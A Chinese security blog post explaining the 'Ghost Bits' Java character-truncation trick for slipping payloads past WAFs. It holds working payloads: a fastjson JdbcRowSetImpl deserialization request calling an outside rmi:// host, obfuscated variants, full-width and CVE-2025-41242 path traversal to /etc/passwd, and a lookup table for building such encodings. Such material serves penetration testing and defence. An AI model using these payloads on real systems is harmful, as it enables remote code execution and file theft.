---
title: 测试人员如何测试Ghost Bits
url: https://mp.weixin.qq.com/s/nsoXS8k8pARrqp3FsBc1Aw
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:58:03.215855
---

# 测试人员如何测试Ghost Bits

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/DRNXoxlicJJtwlxBaMibUwLG2GtcNCfxYogvYVZaoMdjXTEvMGaLfZKra3JzQZCzcXMYjE31tsm8sCNWlwD5FWo0djRyZtlLuicgPI8VqfabYE/0?wx_fmt=jpeg)

# 测试人员如何测试Ghost Bits

原创

CatalyzeSec
CatalyzeSec

CatalyzeSec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640)

什么是Ghost Bits

简单来说Ghost bits就是高位丢弃，只截取低位，比如：陪U+966A只截取低位的6A就是j

GhostBits机制就是对现有已存在的漏洞进行各种bypass，尝试绕过各种字符拦截或者伪装，接下来来看看他的使用条件和应用场景

使用条件：

* 必须是Java后端，只有 Java 的 char 是 16 位 UTF-16，且存在大量隐式 char→byte 截断代码模式
* 存在截断 Sink，代码中有截断高 8 位的操作

在靶场webgoat中，可以看到中文字符被转换成unicode字符显示在页面中，如果这里页面直接显示j的话，表明这里存在截断

```
陪 → U+966A → j
```

![](https://mmbiz.qpic.cn/mmbiz_png/DRNXoxlicJJuZhicfPjkGwX8QtGpyQwMcnz4cNicrMfRClUF6iaIvCwfhib1hiaLnt4NTumt6aSSicKvzDoXPEQulaB2XK1IDkaSeV7mIK8Jhsph8I/640?wx_fmt=png)![]()

全角编码在页面中显示出的unicode

```
%２ｅ%２ｅ%２ｆetc%２ｆpasswd   # 全角编码 → Spring URLDecoder → ../etc/passwd％２ｅ％２ｅ／ｅｔｃ／ｐａｓｓｗｄ
```

![](https://mmbiz.qpic.cn/mmbiz_png/DRNXoxlicJJsPUmQsMhRuiamgawDcTEGliaC9f9R2Wxqdjkh0W8cCBKFBqeicRLbZZyLQlPibHcqoP9sUHno6E9FkzJiaFoSYI0sK0Ngkm23swPkA/640?wx_fmt=png)![]()

![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640)

使用场景

|  |  |
| --- | --- |
| BCEL ClassLoader | 在 BCEL 类名中嵌入 Unicode，WAF看不见，ClassLoader 正常加载恶意类 |
| Jackson SQL 注入 | 用汉字（如丰U+4E30）拼出 SQL关键字，1 union select... |
| fastjson \u 转义 & \x 转义 | \u๐๐੪๐type → @type，WAF 拦截不了，\x4\_type → @type |
| Tomcat 文件上传 | 1.陪sp → 1.jsp（陪低8位=j） |
| 全角 URL 编码 | %２ｅ%２ｅ%２ｆ → %2e%2e%2f = ../ |
| Ghost-Bit URL编码（Spring/Undertow/Jetty/Vert.x） | 同一 payload 1ue%2e.陪sp在四个框架中都解出 1ue.jsp |
| Base64 解码 | 用拉丁扩展字符拼出 base64字符串，如 Ō→M |
| Spring4Shell | 字段名 㹣౬ᙡ⑳⑳ 低8位=class，WAF看不见 |

![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640)

fastjson反序列化案例

```
POC{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://e36df90e61.ddns.1433.eu.org./test","autoCommit":true}}
```

Ghost bit变形，可以bypass一些被waf拦截的字符，比如：@变形成\u๐๐੪๐

※注意数据包需在yakit的发送，在burpsuite中使用的话会造成编码异常

```
# 泰文变形{    "b":{        "\u๐๐੪๐type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://e36df90e61.ddns.1433.eu.org./test",        "autoCommit":true    }}
```

|  |  |  |
| --- | --- | --- |
| 原始字符 | ASCII十六进制 | Unicode Digit编码 |
| `@` | `@` | `\u๐๐੪๐` 或 `\u๐๐๔๐` |
| `J` | `J` | `\u๐๐੪๡` 或 `\u๐๐๔๑` |
| `d` | `d` | `\u๐๐๖੪` 或 `\u๐๐๖๔` |
| `S` | `S` | `\u๐๐๕๓` |
| `I` | `I` | `\u๐๐๔๙` |

```
# 多个替换{    "b":{        "\u๐๐๔๐type":"com.sun.rowset.J\u๐๐๖੪bcRow\u๐๐๕๓et\u๐๐๔๙mpl",        "dataSourceName":"rmi://9022f11450.ddns.1433.eu.org./test",        "autoCommit":true    }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640)

CVE-2025-41242

触发条件（必须同时满足）：

* 必须是 Java后端，HTTP 头 Server: Jetty、X-Powered-By: Servlet、Spring Whitelabel 错误页

* Spring Framework 版本为 5.3.0-5.3.43 / 6.0.0-6.0.29 / 6.1.0-6.1.21

* 内嵌 Jetty，必须是 Jetty，Tomcat 或 Undertow 不触发

```
/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64
```

这里有个细节需要注意，目标文件名中至少要有一个字符做percent-encoding（例如把`passwd`写成`passw%64`），否则Spring的路径匹配会提前短路，根本不会调用到那段有问题的解码逻辑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DRNXoxlicJJthPvHcFvUha9132almLgxdJkIFW4fa1YiaaYmLlJVh3d4MpB5kUCtcIAeggj9HJiahrJ1OzmLBAPURd58Ae7stIm0MO1oLx6hrU/640?wx_fmt=png&from=appmsg)

下面这个脚本适用于专门探测 CVE-2025-41242 框架的工具

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DRNXoxlicJJsyy5C0r01Uyt8HSsCDT6EIrSsvbWdzf6hsnicvibJ1nWwl64yfLtN4hibO8MibZdDoEml4Htv1VJhkVS4mX94iaic1XICViajMz6umeI/640?wx_fmt=png&from=appmsg)

## 常用 ASCII 字符 → Ghost Bits Unicode 字符查询表

|  |  |  |  |
| --- | --- | --- | --- |
| ASCII | 目标字符 | Unicode 候选字符（多选） | 备注 |
| 0x00 | `\0` | `U+0000`, `U+4E00`, `U+9600` | 空字节 |
| 0x0A | `\n` | `U+000A`, `U+4E0A`, `U+760A`(瘊), `U+960A` | CRLF 注入核心 |
| 0x0D | `\r` | `U+000D`, `U+4E0D`, `U+760D`(瘍), `U+960D` | CRLF 注入核心 |
| 0x20 | (空格) | `U+0020`, `U+4E20`, `U+6720`, `U+9620` |  |
| 0x25 | `%` | `U+0025`, `U+4E25`(严), `U+9625` | URL 编码关键 |
| 0x2E | `.` | `U+002E`, `U+4E2E`, `U+962E`(阮) | 路径遍历关键 |
| 0x2F | `/` | `U+002F`, `U+4E2F`, `U+962F` | 路径分隔符 |
| 0x30 | `0` | `U+0030`, `U+0E50`(๐), `U+0A66`(੦), `U+4E30`(丰), `U+7530` | 数字零，fastjson 可用泰文 |
| 0x31 | `1` | `U+0031`, `U+0E51`(๑), `U+0A67`(੧), `U+4E31` |  |
| 0x32 | `2` | `U+0032`, `U+0E52`(๒), `U+0A68`(੨), `U+7532`(甲) |  |
| 0x33 | `3` | `U+0033`, `U+0E53`, `U+4E33` |  |
| 0x34 | `4` | `U+0034`, `U+0E54`, `U+4E34` |  |
| 0x35 | `5` | `U+0035`, `U+0E55`, `U+4E35` |  |
| 0x36 | `6` | `U+0036`, `U+0E56`, `U+4E36` |  |
| 0x37 | `7` | `U+0037`, `U+0E57`, `U+4E37` |  |
| 0x38 | `8` | `U+0038`, `U+0E58`, `U+4E38` |  |
| 0x39 | `9` | `U+0039`, `U+0E59`, `U+4E39` |  |
| 0x3C | `<` | `U+003C`, `U+4E3C`, `U+963C` | XSS / XML 注入 |
| 0x3E | `>` | `U+003E`, `U+4E3E`, `U+963E` | XSS / XML 注入 |
| 0x40 | `@` | `U+0040`, `U+4E40`, `U+9640` | fastjson @type |
| 0x41 | `A` | `U+0041`, `U+4E41`, `U+9641` |  |
| 0x42 | `B` | `U+0042`, `U+4E42`, `U+9642` | BCEL |
| 0x43 | `C` | `U+0043`, `U+4E43`, `U+9643` |  |
| 0x44 | `D` | `U+0044`, `U+4E44`, `U+9644` |  |
| 0x45 | `E` | `U+0045`, `U+4E45`, `U+9645` |  |
| 0x46 | `F` | `U+0046`, `U+4E46`, `U+9646` |  |
| 0x5C | `\` | `U+005C`, `U+4E5C`, `U+965C` | 转义符 |
| 0x5F | `_` | `U+005F`, `U+4E5F`, `U+965F` | fastjson \x 绕过：digits[0x5F]=0 |
| 0x61 | `a` | `U+0061`, `U+4E61`, `U+9661` |  |
| 0x62 | `b` | `U+0062`, `U+4E62`, `U+9662` |  |
| 0x63 | `c` | `U+0063`, `U+4E63`, `U+9663` | class |
| 0x64 | `d` | `U+0064`, `U+4E64`, `U+9664` |  |
| 0x65 | `e` | `U+0065`, `U+4E65`, `U+6765`(来), `U+9665`, `U+FF45`(ｅ) | 全角 e |
| 0x66 | `f` | `U+0066`, `U+4E66`, `U+9666`, `U+FF46`(ｆ) | 全角 f |
| 0x67 | `g` | `U+0067`, `U+4E67`, `U+9667` |  |
| 0x68 | `h` | `U+0068`, `U+4E68`, `U+9668` |  |
| 0x69 | `i` | `U+0069`, `U+4E69`, `U+9669` |  |
| 0x6A | `j` | `U+006A`, `U+4E6A`, `U+966A`(陪) | jsp 文件上传绕过 |
| 0x6B | `k` | `U+006B`, `U+4E6B`, `U+966B` |  |
| 0x6C | `l` | `U+006C`, `U+4E6C`, `U+966C` |  |
| 0x6D | `m` | `U+006D`, `U+4E6D`, `U+966D` |  |
| 0x6E | `n` | `U+006E`, `U+4E6E`, `U+966E` | Jetty: %6> → n |
| 0x6F | `o` | `U+006F`, `U+4E6F`, `U+966F` |  |
| 0x70 | `p` | `U+0070`, `U+4E70`, `U+9670` | jsp |
| 0x71 | `q` | `U+0071`, `U+4E71`, `U+9671` |  |
| 0x72 | `r` | `U+0072`, `U+4E72`, `U+9672` |  |
| 0x73 | `s` | `U+0073`, `U+4E73`, `U+9673` |  |
| 0x74 | `t` | `U+0074`, `U+4E74`, `U+9674` |  |
| 0x75 | `u` | `U+0075`, `U+4E75`, `U+7075`(灵), `U+9675` | \u 转义 |
| 0x76 | `v` | `U+0076`, `U+4E76`, `U+9676` |  |
| 0x77 | `w` | `U+0077`, `U+4E77`, `U+9677` |  |
| 0x78 | `x` | `U+0078`, `U+4E78`, `U+9678` | \x 转义 |
| 0x79 | `y` | `U+0079`, `U+4E79`, `U+9679` |  |
| 0x7A | `z` | `U+007A`, `U+4E7A`, `U+967A` |  |

![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640)

免责申明

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykH1KHFqibib8xIJtOkJbKW7UIiapCYNUtnwa99blUPhUWE1X554Q7GCRtPLghVWT4WvT4D8OEMvtVHQ/0?wx_fmt=png)

CatalyzeSec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykH1KHFqibib8xIJtOkJbKW7UIiapCYNUtnwa99blUPhUWE1X554Q7GCRtPLghVWT4WvT4D8OEMvtVHQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过